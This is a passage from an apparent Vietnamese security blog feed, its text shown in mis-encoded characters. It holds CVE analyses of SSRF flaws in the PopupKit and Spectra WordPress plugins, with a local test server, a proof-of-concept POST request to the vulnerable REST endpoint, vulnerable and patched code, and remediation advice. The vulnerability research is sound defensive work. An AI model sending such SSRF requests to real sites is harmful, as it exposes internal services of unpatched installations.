c√¥ng v·ªõi &lt;code&gt;permission_callback =&amp;gt; &#39;__return_true&#39;&lt;/code&gt;, nghƒ©a l√† &lt;strong&gt;b·ªè qua c∆° ch·∫ø ki·ªÉm tra quy·ªÅn&lt;/strong&gt; ·ªü tr√™n, d·∫´n ƒë·∫øn vi·ªác b·∫•t k·ª≥ ai (k·ªÉ c·∫£ anonymous user) c≈©ng c√≥ th·ªÉ g·ªçi API n√†y.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;Khi g·ª≠i y√™u c·∫ßu &lt;strong&gt;POST&lt;/strong&gt; ƒë·∫øn endpoint &lt;code&gt;/wp-json/pbb/v1/live-preview&lt;/code&gt;, h√†m &lt;code&gt;fetch_external_content()&lt;/code&gt; s·∫Ω ƒë∆∞·ª£c th·ª±c thi. H√†m n√†y nh·∫≠n gi√° tr·ªã &lt;code&gt;url&lt;/code&gt; t·ª´ tham s·ªë y√™u c·∫ßu, th·ª±c hi·ªán &lt;strong&gt;fetch request&lt;/strong&gt; t·ªõi ƒë·ªãa ch·ªâ ƒë√≥ v√† tr·∫£ v·ªÅ &lt;strong&gt;body&lt;/strong&gt; c·ªßa ph·∫£n h·ªìi.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;exploit&#34;&gt;&lt;span&gt;Exploit&lt;/span&gt;&#xA;  &lt;a href=&#34;#exploit&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;local-server&#34;&gt;&lt;span&gt;Local Server&lt;/span&gt;&#xA;  &lt;a href=&#34;#local-server&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;T·∫°o local service ƒë∆°n gi·∫£n b·∫±ng python&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;from flask import Flask, send_from_directory&#xA;import os&#xA;&#xA;BASE_DIR = os.path.abspath(os.getcwd())&#xA;app = Flask(__name__)&#xA;&#xA;@app.route(&amp;#39;/metadata&amp;#39;)&#xA;def test():&#xA;    return send_from_directory(BASE_DIR, &amp;#39;metadata.json&amp;#39;, as_attachment=True)&#xA;&#xA;if __name__ == &amp;#39;__main__&amp;#39;:&#xA;    app.run(host=&amp;#39;0.0.0.0&amp;#39;, port=8001, debug=True)&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;{&#xA;  &amp;#34;metadata&amp;#34;: &amp;#34;Internal service data&amp;#34;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;G·ª≠i POST request ƒë·∫øn endpoint&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-json/pbb/v1/live-preview HTTP/1.1&#xA;Host: localhost&#xA;...&#xA;&#xA;url=http://localhost:8001/metadata&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Result&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-10-27-cve-2025-10861/result.png&#34; title=&#34;N·ªôi dung ƒë·ªçc ƒë∆∞·ª£c t·ª´ local service&#34; data-thumbnail=&#34;/posts/2025-10-27-cve-2025-10861/result.png&#34; data-sub-html=&#34;&lt;h2&gt;Result&lt;/h2&gt;&lt;p&gt;N·ªôi dung ƒë·ªçc ƒë∆∞·ª£c t·ª´ local service&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-10-27-cve-2025-10861/result.png&#39; alt=&#34;Result&#34; height=&#34;398&#34; width=&#34;1543&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;N·ªôi dung ƒë·ªçc ƒë∆∞·ª£c t·ª´ local service&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Phi√™n b·∫£n &lt;strong&gt;‚â§ 2.1.4&lt;/strong&gt; c·ªßa &lt;strong&gt;PopupKit&lt;/strong&gt; c√≥ l·ªó h·ªïng &lt;strong&gt;SSRF&lt;/strong&gt;: endpoint &lt;code&gt;/wp-json/pbb/v1/live-preview&lt;/code&gt; cho ph√©p &lt;strong&gt;anonymous&lt;/strong&gt; g·ªçi &lt;code&gt;fetch_external_content()&lt;/code&gt; v·ªõi tham s·ªë &lt;code&gt;url&lt;/code&gt; t·ª´ client; h√†m n√†y d√πng &lt;code&gt;wp_remote_get()&lt;/code&gt; v√† tr·∫£ v·ªÅ tr·ª±c ti·∫øp ph·∫ßn body, do ƒë√≥ c√≥ th·ªÉ b·ªã l·ª£i d·ª•ng ƒë·ªÉ truy v·∫•n c√°c d·ªãch v·ª• n·ªôi b·ªô. B·∫£n &lt;strong&gt;2.1.5&lt;/strong&gt; ƒë√£ chuy·ªÉn sang &lt;code&gt;wp_safe_remote_get()&lt;/code&gt; v√† gi·ªõi h·∫°n quy·ªÅn truy c·∫≠p (ch·ªâ admin), gi√∫p gi·∫£m r·ªßi ro.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;C·∫≠p nh·∫≠t&lt;/strong&gt; l√™n &lt;strong&gt;2.1.5+&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Kh√¥ng tin URL client&lt;/strong&gt; ‚Äî x√°c th·ª±c/allowlist tr∆∞·ªõc khi fetch.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;D√πng &lt;code&gt;wp_safe_remote_get()&lt;/code&gt;&lt;/strong&gt; v√† ki·ªÉm tra th√™m (redirects, DNS).&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Kh√¥ng d√πng &lt;code&gt;permission_callback =&amp;gt; __return_true&lt;/code&gt;&lt;/strong&gt;; gi·ªõi h·∫°n quy·ªÅn.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Kh√¥ng tr·∫£ nguy√™n body th√¥&lt;/strong&gt; n·∫øu kh√¥ng c·∫ßn thi·∫øt.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.wiki/en/pentesting-web/ssrf-server-side-request-forgery/index.html&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;SSRF (Server Side Request Forgery) ‚Äî Hacktrick&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/popup-builder-block/vulnerability/wordpress-popup-builder-with-gamification-multi-step-popups-page-level-targeting-and-woocommerce-triggers-plugin-2-1-4-unauthenticated-server-side-request-forgery-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt; WordPress PopupKit Plugin &amp;lt;= 2.1.4 is vulnerable to Server Side Request Forgery (SSRF) &lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2023-36679 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-10-23-cve-2023-36679/</link>
      <pubDate>Thu, 23 Oct 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-10-23-cve-2023-36679/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-10-23-cve-2023-36679/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;L·ªó h·ªïng Server Side Request Forgery (SSRF) ƒë√£ ƒë∆∞·ª£c ph√°t hi·ªán trong plugin WordPress &lt;strong&gt;Spectra&lt;/strong&gt; (tr∆∞·ªõc ƒë√¢y g·ªçi l√† &lt;strong&gt;Ultimate Addons cho Gutenberg&lt;/strong&gt;) ·∫£nh h∆∞·ªüng ƒë·∫øn c√°c phi√™n b·∫£n l√™n t·ªõi &lt;code&gt;2.6.6&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2023-36679&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2023-36679&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Server Side Request Forgery (SSRF)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 2.6.6&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 2.6.7&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Low (7.1)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Contributor&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/ultimate-addons-for-gutenberg/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Spectra Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;: &lt;a href=&#34;https://w41bu1.github.io/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Local WordPress and Debugging&lt;/a&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin versions&lt;/strong&gt; - &lt;strong&gt;Spectra&lt;/strong&gt;: &lt;strong&gt;2.6.6&lt;/strong&gt; (vulnerable) v√† &lt;strong&gt;2.6.7&lt;/strong&gt; (patched).&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff tool&lt;/strong&gt; - &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; ho·∫∑c b·∫•t k·ª≥ c√¥ng c·ª• so s√°nh (diff) n√†o ƒë·ªÉ ki·ªÉm tra v√† so s√°nh kh√°c bi·ªát gi·ªØa hai phi√™n b·∫£n.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;patch-diff&#34;&gt;&lt;span&gt;Patch diff&lt;/span&gt;&#xA;  &lt;a href=&#34;#patch-diff&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;B·∫£n l·ªói&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function template_importer() {&#x9;&#xA;    if ( ! current_user_can( &amp;#39;edit_posts&amp;#39; ) ) {&#xA;        wp_send_json_error( __( &amp;#39;You are not allowed to perform this action&amp;#39;, &amp;#39;astra-sites&amp;#39; ) );&#xA;    }&#xA;    // Verify Nonce.&#xA;    check_ajax_referer( &amp;#39;ast-block-templates-ajax-nonce&amp;#39;, &amp;#39;_ajax_nonce&amp;#39; );&#xA;    // other logic&#xA;    $api_args = apply_filters(&#xA;        &amp;#39;ast_block_templates_api_args&amp;#39;,&#xA;        array(&#xA;            &amp;#39;timeout&amp;#39; =&amp;gt; 15,&#xA;        )&#xA;    );&#xA;    $api_uri = ( isset( $_REQUEST[&amp;#39;api_uri&amp;#39;] ) ) ? esc_url_raw( $_REQUEST[&amp;#39;api_uri&amp;#39;] ) : &amp;#39;&amp;#39;;&#xA;    $request_params = apply_filters(&#xA;        &amp;#39;ast_block_templates_api_params&amp;#39;,&#xA;        array(&#xA;            &amp;#39;_fields&amp;#39; =&amp;gt; &amp;#39;original_content&amp;#39;,&#xA;        )&#xA;    );&#xA;    $demo_api_uri = esc_url_raw( add_query_arg( $request_params, $api_uri ) );&#xA;&#xA;    // API Call.&#xA;    $response = wp_remote_get( $demo_api_uri, $api_args );&#xA;    // other logic&#xA;    $data = json_decode( wp_remote_retrieve_body( $response ), true );&#xA;&#xA;    wp_send_json_success( $data[&amp;#39;original_content&amp;#39;] );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Trong phi√™n b·∫£n 2.6.6, h√†m &lt;code&gt;template_importer()&lt;/code&gt; nh·∫≠n tham s·ªë &lt;code&gt;api_uri&lt;/code&gt; tr·ª±c ti·∫øp t·ª´ bi·∫øn &lt;code&gt;$_REQUEST&lt;/code&gt; v√† s·ª≠ d·ª•ng gi√° tr·ªã n√†y ƒë·ªÉ g·ª≠i HTTP request th√¥ng qua h√†m &lt;code&gt;wp_remote_get()&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;p&gt;Do kh√¥ng c√≥ b∆∞·ªõc x√°c th·ª±c ho·∫∑c gi·ªõi h·∫°n ngu·ªìn, k·∫ª t·∫•n c√¥ng c√≥ th·ªÉ cung c·∫•p m·ªôt URL t√πy √Ω ƒë·ªÉ √©p m√°y ch·ªß th·ª±c hi·ªán request ƒë·∫øn c√°c ƒë·ªãa ch·ªâ n·ªôi b·ªô. ƒêi·ªÅu n√†y t·∫°o ra l·ªó h·ªïng &lt;strong&gt;Server-Side Request Forgery (SSRF)&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;B·∫£n v√°&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function template_importer() {&#x9;&#xA;    if ( ! current_user_can( &amp;#39;edit_posts&amp;#39; ) ) {&#xA;        wp_send_json_error( __( &amp;#39;You are not allowed to perform this action&amp;#39;, &amp;#39;astra-sites&amp;#39; ) );&#xA;    }&#xA;    // Verify Nonce.&#xA;    check_ajax_referer( &amp;#39;ast-block-templates-ajax-nonce&amp;#39;, &amp;#39;_ajax_nonce&amp;#39; );&#xA;    // other logic&#xA;    $api_args = apply_filters(&#xA;        &amp;#39;ast_block_templates_api_args&amp;#39;,&#xA;        array(&#xA;            &amp;#39;timeout&amp;#39; =&amp;gt; 15,&#xA;        )&#xA;    );&#xA;    $block_id   = isset( $_REQUEST[&amp;#39;id&amp;#39;] ) ? absint( $_REQUEST[&amp;#39;id&amp;#39;] ) : &amp;#39;&amp;#39;;&#xA;    $block_data = get_option( &amp;#39;ast-block-templates_data-&amp;#39; . $block_id );&#xA;    $api_uri = null !== $block_data ? $block_data-&amp;gt;{&amp;#39;astra-page-api-url&amp;#39;} : &amp;#39;&amp;#39;;&#xA;    $request_params = apply_filters(&#xA;        &amp;#39;ast_block_templates_api_params&amp;#39;,&#xA;        array(&#xA;            &amp;#39;_fields&amp;#39; =&amp;gt; &amp;#39;original_content&amp;#39;,&#xA;        )&#xA;    );&#xA;    $demo_api_uri = esc_url_raw( add_query_arg( $request_params, $api_uri ) );&#xA;&#xA;    // API Call.&#xA;    $response = wp_remote_get( $demo_api_uri, $api_args );&#xA;    // other logic&#xA;    $data = json_decode( wp_remote_retrieve_body( $response ), true );&#xA;&#xA;    wp_send_json_success( $data[&amp;#39;original_content&amp;#39;] );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;B·∫£n v√° ƒë√£ lo·∫°i b·ªè vi·ªác nh·∫≠n URL tr·ª±c ti·∫øp t·ª´ ng∆∞·ªùi d√πng. Thay v√†o ƒë√≥, m√£ ch·ªâ nh·∫≠n &lt;strong&gt;ID c·ªßa block&lt;/strong&gt; th√¥ng qua &lt;code&gt;$_REQUEST[&#39;id&#39;]&lt;/code&gt; v√† truy xu·∫•t URL t∆∞∆°ng ·ª©ng t·ª´ c∆° s·ªü d·ªØ li·ªáu (&lt;code&gt;wp_options&lt;/code&gt;) b·∫±ng kh√≥a &lt;code&gt;ast-block-templates_data-{id}&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;p&gt;Nh·ªù ƒë√≥, URL ƒë∆∞·ª£c gi·ªõi h·∫°n trong c√°c b·∫£n ghi ƒë∆∞·ª£c qu·∫£n l√Ω s·∫µn trong h·ªá th·ªëng, lo·∫°i b·ªè kh·∫£ nƒÉng ng∆∞·ªùi d√πng t·ª± cung c·∫•p ƒë∆∞·ªùng d·∫´n t√πy √Ω. C∆° ch·∫ø n√†y gi√∫p ngƒÉn ch·∫∑n ho√†n 